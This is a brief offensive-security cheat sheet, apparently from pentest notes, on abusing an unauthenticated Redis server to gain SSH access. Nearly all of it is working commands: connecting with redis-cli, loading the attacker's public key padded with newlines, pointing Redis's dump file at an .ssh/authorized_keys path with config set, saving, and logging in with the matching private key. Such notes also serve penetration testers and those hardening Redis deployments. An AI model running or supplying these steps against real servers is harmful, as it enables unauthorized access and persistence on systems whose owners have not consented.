# Redis Unauthenticated SSH Key Write

Unauthenticated Redis allows arbitrary writes via `SAVE` — write SSH key to `authorized_keys`.

```bash
# Check if Redis is open (no auth)
redis-cli -h <TARGET>
keys *

# Write SSH public key
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") | \
  redis-cli -h <TARGET> -x set pwn

redis-cli -h <TARGET>
> config set dir /home/redis/.ssh          # or /root/.ssh if redis runs as root
> config set dbfilename "authorized_keys"
> save
> quit

ssh -i ~/.ssh/id_rsa redis@<TARGET>
```

**Finding the home dir:**
```
config get dir   # shows current working dir — often home/.ssh parent
```
Extra newlines make the binary DB content ignored by sshd; only the key line is parsed.
